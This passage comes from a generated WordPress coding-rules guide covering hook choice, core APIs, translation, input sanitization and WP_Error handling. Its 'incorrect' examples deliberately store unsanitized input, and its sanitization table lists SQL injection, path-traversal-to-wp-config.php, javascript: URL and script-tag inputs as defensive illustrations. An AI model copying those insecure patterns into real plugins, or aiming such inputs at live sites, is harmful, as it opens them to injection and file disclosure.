add_action( 'init', function() {
    register_post_type( 'product', [
        'public'      => true,
        'label'       => 'Products',
        'has_archive' => true,
        'supports'    => [ 'title', 'editor', 'thumbnail' ],
    ]);

    register_taxonomy( 'product_category', 'product', [
        'hierarchical' => true,
        'label'        => 'Categories',
    ]);
});

// ✅ Frontend scripts: wp_enqueue_scripts
add_action( 'wp_enqueue_scripts', function() {
    wp_enqueue_script( 'my-script', plugin_dir_url( __FILE__ ) . 'script.js', [], '1.0', true );
});

// ✅ Admin scripts: admin_enqueue_scripts (with page check)
add_action( 'admin_enqueue_scripts', function( $hook ) {
    if ( 'settings_page_my-plugin' !== $hook ) return;
    wp_enqueue_script( 'my-admin', plugin_dir_url( __FILE__ ) . 'admin.js', [], '1.0', true );
});

// ✅ Admin-only processing: admin_init
add_action( 'admin_init', function() {
    register_setting( 'my_plugin_group', 'my_plugin_option' );
});

// ✅ Admin menus: admin_menu
add_action( 'admin_menu', function() {
    add_options_page( 'My Plugin', 'My Plugin', 'manage_options', 'my-plugin', 'render_page' );
});

// ✅ Code that needs all plugins + theme loaded: after_setup_theme or wp_loaded
add_action( 'after_setup_theme', function() {
    add_theme_support( 'post-thumbnails' );
    add_theme_support( 'title-tag' );
});

// ✅ REST API routes: rest_api_init
add_action( 'rest_api_init', function() {
    register_rest_route( 'myplugin/v1', '/data', [ ... ] );
});
```

**Hook cheat sheet:**

| Operation | Hook |
|-----------|------|
| Register CPT/taxonomy | `init` |
| Register shortcodes | `init` |
| Frontend scripts/styles | `wp_enqueue_scripts` |
| Admin scripts/styles | `admin_enqueue_scripts` |
| Admin menus | `admin_menu` |
| Admin settings | `admin_init` |
| REST API routes | `rest_api_init` |
| Theme features | `after_setup_theme` |
| Widgets | `widgets_init` |
| AJAX handlers | `wp_ajax_{action}` |
| Cron jobs | `{custom_cron_hook}` |
| Modify main query | `pre_get_posts` |

**Detection hints:**

```bash
# Find CPT registration on wrong hook
grep -rn "add_action.*plugins_loaded.*register_post_type\|add_action.*admin_init.*register_post_type" wp-content/ --include="*.php"
# Find script enqueue on wrong hook
grep -rn "add_action.*'init'.*enqueue" wp-content/ --include="*.php"
```

Reference: [Plugin API / Action Reference](https://developer.wordpress.org/apis/hooks/action-reference/) · [WordPress Initialization](https://developer.wordpress.org/plugins/hooks/)

---

## Use WordPress APIs Instead of Raw PHP Functions

**Impact: MEDIUM (ensures compatibility with caching layers, managed hosts, security plugins, and multisite)**

WordPress wraps common PHP operations with APIs that add caching, security hooks, host compatibility, and proper error handling. Using raw PHP functions bypasses all of these layers — breaking on managed hosts (WP VIP, Kinsta, Pantheon), evading security plugin filters, and skipping the object cache.

**Incorrect (raw PHP functions):**

```php
// ❌ Direct SQL instead of WP_Query — bypasses caching, filters, permissions
global $wpdb;
$posts = $wpdb->get_results(
    "SELECT * FROM wp_posts WHERE post_type = 'product' AND post_status = 'publish'"
);

// ❌ curl instead of wp_remote_get — ignores proxy settings, SSL config, hooks
$ch = curl_init( 'https://api.example.com/data' );
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
$result = curl_exec( $ch );
curl_close( $ch );

// ❌ file_put_contents — wrong file owner on shared hosts, no FTP/SSH support
file_put_contents( WP_CONTENT_DIR . '/exports/data.csv', $csv_data );

// ❌ file_get_contents for URLs — no timeout, no SSL verification, no proxy
$html = file_get_contents( 'https://example.com/feed.xml' );

// ❌ mail() — skips wp_mail hooks, doesn't use configured SMTP
mail( $to, $subject, $body );

// ❌ json_encode for AJAX responses — missing headers, no hooks
echo json_encode( [ 'success' => true ] );
exit;
```

**Correct (WordPress API equivalents):**

```php
// ✅ WP_Query — cached, filtered, respects post status and capabilities
$products = new WP_Query([
    'post_type'   => 'product',
    'post_status' => 'publish',
]);

// ✅ wp_remote_get — respects proxy, SSL, and timeout settings
$response = wp_remote_get( 'https://api.example.com/data', [
    'timeout' => 15,
    'headers' => [ 'Accept' => 'application/json' ],
]);
if ( ! is_wp_error( $response ) ) {
    $body = wp_remote_retrieve_body( $response );
    $code = wp_remote_retrieve_response_code( $response );
}

// ✅ WP_Filesystem — works on FTP/SSH hosts, respects file permissions
global $wp_filesystem;
if ( ! function_exists( 'WP_Filesystem' ) ) {
    require_once ABSPATH . 'wp-admin/includes/file.php';
}
WP_Filesystem();

$upload_dir = wp_upload_dir();
$wp_filesystem->put_contents(
    $upload_dir['basedir'] . '/exports/data.csv',
    $csv_data,
    FS_CHMOD_FILE
);

// ✅ wp_mail — uses configured SMTP, applies wp_mail hooks
wp_mail( $to, $subject, $body, [ 'Content-Type: text/html; charset=UTF-8' ] );

// ✅ wp_send_json — sets headers, applies hooks, calls wp_die()
wp_send_json_success( [ 'message' => 'Done' ] );
// or: wp_send_json_error( 'Something failed', 400 );
```

**API substitution reference:**

| Raw PHP | WordPress API | Why |
|---------|--------------|-----|
| `$wpdb->get_results("SELECT...")` | `new WP_Query([...])` | Caching, filters, permissions |
| `curl_init()` | `wp_remote_get()` / `wp_remote_post()` | Proxy, SSL, hooks |
| `file_get_contents($url)` | `wp_remote_get($url)` | Timeout, error handling |
| `file_put_contents()` | `$wp_filesystem->put_contents()` | FTP/SSH host support |
| `file_get_contents($path)` | `$wp_filesystem->get_contents()` | Permission compatibility |
| `unlink()` | `wp_delete_file()` | Hooks for cleanup |
| `mail()` | `wp_mail()` | SMTP config, hooks |
| `echo json_encode()` | `wp_send_json_success/error()` | Headers, die |
| `header('Location:...')` | `wp_redirect()` / `wp_safe_redirect()` | Validation, hooks |

**When direct `$wpdb` IS appropriate:**

- Custom tables not managed by WordPress (e.g., plugin-specific log tables)
- Complex queries that WP_Query cannot express (multi-table JOINs)
- Performance-critical batch operations (always use `$wpdb->prepare()`)

**Detection hints:**

```bash
# Find raw PHP functions that have WP API equivalents
grep -rn "curl_init\|file_put_contents\|file_get_contents.*http\|\bmail\s*(" wp-content/plugins/ --include="*.php"
# Find direct header redirects instead of wp_redirect
grep -rn "header.*Location" wp-content/plugins/ --include="*.php"
```

Reference: [HTTP API](https://developer.wordpress.org/apis/making-http-requests/) · [Filesystem API](https://developer.wordpress.org/apis/filesystem/) · [wp_mail()](https://developer.wordpress.org/reference/functions/wp_mail/)

---

## Make All User-Facing Strings Translatable

**Impact: MEDIUM (enables translation to other languages and prevents XSS through malicious translation files)**

Every user-facing string in a WordPress plugin or theme should be wrapped in a translation function with a text domain. Without this, your code cannot be translated to other languages — a requirement for the WordPress.org plugin/theme directory.

Critically, **always use escaped variants** (`esc_html__()`, `esc_html_e()`, `esc_attr__()`) when outputting translated strings. Third-party translators can inject HTML through `.po` translation files, creating a stored XSS vector.

**Incorrect (hardcoded English strings):**

```php
// ❌ Not translatable
echo '<h2>Settings</h2>';
echo '<p>Welcome back, ' . $username . '!</p>';
echo '<button>Save Changes</button>';
echo '<input placeholder="Enter your name">';

// ❌ Translatable but not escaped — XSS via malicious translation file
echo '<h2>' . __( 'Settings', 'my-plugin' ) . '</h2>';
_e( 'Save Changes', 'my-plugin' ); // _e() echoes without escaping

// ❌ Variables inside translated strings (untranslatable word order)
echo __( 'Found ', 'my-plugin' ) . $count . __( ' results', 'my-plugin' );
// "Found 5 results" — word order is English-specific
```

**Correct (translatable and escaped):**

```php
// ✅ Escaped translated output
echo '<h2>' . esc_html__( 'Settings', 'my-plugin' ) . '</h2>';
esc_html_e( 'Save Changes', 'my-plugin' );
echo '<input placeholder="' . esc_attr__( 'Enter your name', 'my-plugin' ) . '">';

// ✅ Variables in translated strings — use printf with placeholders
printf(
    /* translators: %s: username */
    esc_html__( 'Welcome back, %s!', 'my-plugin' ),
    esc_html( $username )
);

// ✅ Plural forms (different languages have different plural rules)
printf(
    esc_html( _n(
        '%d result found',
        '%d results found',
        $count,
        'my-plugin'
    ) ),
    $count
);

// ✅ Context disambiguation (same English word, different meaning)
$post_noun = _x( 'Post', 'noun: a blog post', 'my-plugin' );
$post_verb = _x( 'Post', 'verb: to publish', 'my-plugin' );

// ✅ URLs in translated strings
printf(
    wp_kses(
        /* translators: %s: documentation URL */
        __( 'Read the <a href="%s">documentation</a> for more info.', 'my-plugin' ),
        [ 'a' => [ 'href' => [] ] ]
    ),
    esc_url( 'https://docs.example.com' )
);
```

**Translation function reference:**

| Context | Return | Echo |
|---------|--------|------|
| Plain string | `__( $text, $domain )` | `_e( $text, $domain )` |
| HTML-escaped | `esc_html__( $text, $domain )` | `esc_html_e( $text, $domain )` |
| Attribute-escaped | `esc_attr__( $text, $domain )` | `esc_attr_e( $text, $domain )` |
| Plural forms | `_n( $single, $plural, $count, $domain )` | — (use with printf) |
| With context | `_x( $text, $context, $domain )` | `_ex( $text, $context, $domain )` |

**Key rules:**

1. **Always use the text domain** — the second parameter matching your plugin/theme slug
2. **Never concatenate translated fragments** — use printf placeholders instead
3. **Always escape translated output** — use `esc_html__()` not `__()`
4. **Add translator comments** before strings with placeholders: `/* translators: %s: username */`
5. **Never include HTML in translated strings** unless you use `wp_kses()` on the output

**Detection hints:**

```bash
# Find hardcoded English strings in PHP output
grep -rn "echo\s*'[A-Z]\|echo\s*\"[A-Z]" wp-content/plugins/my-plugin/ --include="*.php" | grep -v "__\|_e\|esc_"
# Find unescaped translation output
grep -rn "\b_e\s*(\|echo\s*__\s*(" wp-content/plugins/ --include="*.php"
```

Reference: [WordPress Internationalization](https://developer.wordpress.org/plugins/internationalization/) · [How to Internationalize Your Plugin](https://developer.wordpress.org/plugins/internationalization/how-to-internationalize-your-plugin/)

---

## Sanitize All User Input with Type-Appropriate Functions

**Impact: HIGH (prevents injection attacks and data corruption by ensuring input matches expected types)**

WordPress provides specialized sanitization functions for different data types. Using the wrong one — or none at all — leaves your code vulnerable to XSS, SQL injection, and data corruption. The rule: **sanitize on input (before storage), escape on output (before display).**

Always call `wp_unslash()` before sanitizing superglobal data, because WordPress automatically adds slashes via `wp_magic_quotes()`.

**Incorrect (raw superglobals):**

```php
// ❌ Raw input stored directly
update_option( 'my_title', $_POST['title'] );
update_post_meta( $post_id, 'email', $_POST['email'] );
$page = $_GET['page'];
$ids = $_POST['selected_ids'];
$content = $_POST['description'];

// ❌ Wrong sanitization for the data type
$email = sanitize_text_field( $_POST['email'] ); // Doesn't validate email format
$url = sanitize_text_field( $_POST['website'] );  // Doesn't validate URL structure
$id = sanitize_text_field( $_POST['post_id'] );   // String sanitizer on an integer
```

**Correct (type-appropriate sanitization):**

```php
// ✅ Always wp_unslash() first, then sanitize to match data type

// Plain text (strips tags, extra whitespace, invalid UTF-8)
$title = sanitize_text_field( wp_unslash( $_POST['title'] ) );

// Email (strips invalid email characters)
$email = sanitize_email( wp_unslash( $_POST['email'] ) );

// URL (for storage — strips bad protocols, encodes)
$url = esc_url_raw( wp_unslash( $_POST['website'] ) );

// Integer / ID (converts to absolute integer — "1 OR 1=1" becomes 1)
$post_id = absint( $_POST['post_id'] );

// Array of integers
$ids = array_map( 'absint', (array) $_POST['selected_ids'] );

// Rich HTML (allows safe tags like <p>, <a>, <strong>)
$content = wp_kses_post( wp_unslash( $_POST['description'] ) );

// Strict HTML with custom allowlist
$allowed_tags = [
    'a'      => [ 'href' => [], 'title' => [] ],
    'strong' => [],
    'em'     => [],
];
$bio = wp_kses( wp_unslash( $_POST['bio'] ), $allowed_tags );

// Textarea (preserves newlines, strips tags)
$message = sanitize_textarea_field( wp_unslash( $_POST['message'] ) );

// Filename (strips path separators, special characters)
$filename = sanitize_file_name( $_POST['filename'] );

// Database key / slug (lowercase, alphanumeric + dashes)
$slug = sanitize_key( $_POST['slug'] );

// CSS class name
$class = sanitize_html_class( $_POST['css_class'] );

// Hex color
$color = sanitize_hex_color( $_POST['color'] );

// Boolean
$enabled = ! empty( $_POST['enabled'] );
```

**Sanitization function reference:**

| Data type | Function | Example input → output |
|-----------|----------|----------------------|
| Plain text | `sanitize_text_field()` | `<script>hi</script>` → `hi` |
| Email | `sanitize_email()` | `user @exam ple.com` → `user@example.com` |
| URL (storage) | `esc_url_raw()` | `javascript:alert(1)` → `` |
| URL (output) | `esc_url()` | Same + HTML encoding |
| Integer | `absint()` | `"-5 OR 1=1"` → `5` |
| Positive/negative int | `intval()` | `"-5 OR 1=1"` → `-5` |
| Float | `floatval()` | `"3.14abc"` → `3.14` |
| Filename | `sanitize_file_name()` | `../../wp-config.php` → `wp-config.php` |
| Slug/key | `sanitize_key()` | `My Key!!` → `my-key` |
| Textarea | `sanitize_textarea_field()` | Strips tags, keeps newlines |
| Rich HTML | `wp_kses_post()` | Keeps safe HTML tags |
| Custom HTML | `wp_kses()` | Only allows specified tags |
| CSS class | `sanitize_html_class()` | `my class<script>` → `myclassscript` |
| Hex color | `sanitize_hex_color()` | `#ff000` → `null` (invalid) |

**Detection hints:**

```bash
# Find unsanitized superglobal usage
grep -rn "\$_POST\[\|\$_GET\[\|\$_REQUEST\[" wp-content/plugins/ --include="*.php" | grep -v "sanitize_\|absint\|intval\|wp_unslash\|wp_kses\|esc_url"
# Find update_option/update_post_meta with raw input
grep -rn "update_option.*\$_\|update_post_meta.*\$_\|update_user_meta.*\$_" wp-content/plugins/ --include="*.php" | grep -v "sanitize_\|absint\|esc_"
```

Reference: [WordPress Sanitization](https://developer.wordpress.org/apis/security/sanitizing/) · [CWE-20: Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)

---

## Use WP_Error for Error Handling — Not Exceptions or False

**Impact: MEDIUM (enables proper error reporting, debugging, and user-facing error messages)**

WordPress core doesn't use PHP exceptions for error handling — it uses `WP_Error` objects. Functions like `wp_insert_post()`, `wp_remote_get()`, and `wp_create_user()` return `WP_Error` on failure. Your plugin code should follow the same pattern: return `WP_Error` with a structured code, message, and optional data instead of returning `false` or throwing exceptions.

**Incorrect (ambiguous error returns):**

```php
// ❌ Returning false — caller has no idea what went wrong
function create_invoice( int $order_id, array $data ): int|false {
    if ( empty( $data['amount'] ) ) {
        return false; // Why? Missing amount? Invalid amount? Permission issue?
    }

    $order = get_post( $order_id );
    if ( ! $order ) {
        return false; // Same false for a completely different error
    }

    // ...
    return $invoice_id;
}

// Caller has no useful error info
$invoice = create_invoice( $order_id, $data );
if ( ! $invoice ) {
    // What happened? We have no idea. Can't show a useful message.
    echo 'Something went wrong.';
}
```

```php
// ❌ Throwing exceptions (not idiomatic WordPress)
function process_payment( float $amount ): void {
    if ( $amount <= 0 ) {
        throw new \InvalidArgumentException( 'Invalid amount' );
    }
    // WordPress core and most plugins don't catch exceptions
    // Unhandled exception = white screen of death
}
```

```php
// ❌ Not checking wp_remote_get for errors before using result
$response = wp_remote_get( 'https://api.example.com/data' );
$body = json_decode( wp_remote_retrieve_body( $response ), true );
// If $response is WP_Error → wp_remote_retrieve_body returns '' → json_decode returns null → crash
```

**Correct (structured WP_Error returns):**

```php
// ✅ Return WP_Error with code, message, and data
function create_invoice( int $order_id, array $data ): int|WP_Error {
    if ( empty( $data['amount'] ) || $data['amount'] <= 0 ) {
        return new WP_Error(
            'invalid_amount',                                    // Error code (string slug)
            __( 'Invoice amount must be a positive number.', 'my-plugin' ), // Human-readable
            [ 'order_id' => $order_id, 'amount' => $data['amount'] ?? null ] // Debug data
        );
    }

    $order = get_post( $order_id );
    if ( ! $order || 'shop_order' !== $order->post_type ) {
        return new WP_Error(
            'invalid_order',
            __( 'Order not found.', 'my-plugin' ),
            [ 'order_id' => $order_id ]
        );
    }

    if ( ! current_user_can( 'edit_shop_orders' ) ) {
        return new WP_Error(
            'unauthorized',
            __( 'You do not have permission to create invoices.', 'my-plugin' ),
            [ 'status' => 403 ]
        );
    }

    $invoice_id = wp_insert_post([
        'post_type'   => 'invoice',
        'post_status' => 'publish',
        'post_parent' => $order_id,
    ]);

    if ( is_wp_error( $invoice_id ) ) {
        return $invoice_id; // Propagate WordPress's own error
    }

    return $invoice_id;
}
```

```php
// ✅ Caller handles errors with full context
$result = create_invoice( $order_id, $data );

if ( is_wp_error( $result ) ) {
    $code    = $result->get_error_code();    // 'invalid_amount'
    $message = $result->get_error_message(); // 'Invoice amount must be...'
    $data    = $result->get_error_data();    // ['order_id' => 42, 'amount' => -5]

    // In REST API:
    return $result; // WordPress auto-converts to proper JSON error response

    // In admin:
    add_settings_error( 'my_plugin', $code, $message, 'error' );

    // In AJAX:
    wp_send_json_error( $message, $data['status'] ?? 400 );
}

// Success
$invoice_id = $result;
```

```php
// ✅ Always check wp_remote_get before using the result
$response = wp_remote_get( 'https://api.example.com/data' );

if ( is_wp_error( $response ) ) {
    error_log( 'API call failed: ' . $response->get_error_message() );
    return $response; // Propagate the error
}

$code = wp_remote_retrieve_response_code( $response );
if ( 200 !== $code ) {
    return new WP_Error(
        'api_error',
        sprintf( __( 'API returned status %d', 'my-plugin' ), $code ),
        [ 'status' => $code ]
    );
}

$body = json_decode( wp_remote_retrieve_body( $response ), true );
```

```php
// ✅ Collecting multiple errors
$errors = new WP_Error();

if ( empty( $data['email'] ) ) {
    $errors->add( 'missing_email', __( 'Email is required.', 'my-plugin' ) );
}
if ( ! empty( $data['email'] ) && ! is_email( $data['email'] ) ) {
    $errors->add( 'invalid_email', __( 'Email address is invalid.', 'my-plugin' ) );
}
if ( empty( $data['name'] ) ) {
    $errors->add( 'missing_name', __( 'Name is required.', 'my-plugin' ) );
}

if ( $errors->has_errors() ) {
    return $errors; // Contains all validation failures
}
```

**Detection hints:**

```bash
# Find functions returning false on error (candidates for WP_Error)
grep -rn "return false" wp-content/plugins/my-plugin/ --include="*.php" -B 2 | grep -i "error\|fail\|invalid\|missing"
# Find wp_remote_get without is_wp_error check
grep -rn "wp_remote_get\|wp_remote_post" wp-content/plugins/ --include="*.php" -l | xargs grep -L "is_wp_error"
```

Reference: [WP_Error](https://developer.wordpress.org/reference/classes/wp_error/) · [WordPress Error Handling](https://developer.wordpress.org/plugins/security/data-validation/)

---

*Generated by BeforeMerge build script on 2026-02-27.*
*Version: 0.1.0 | Rules: 21*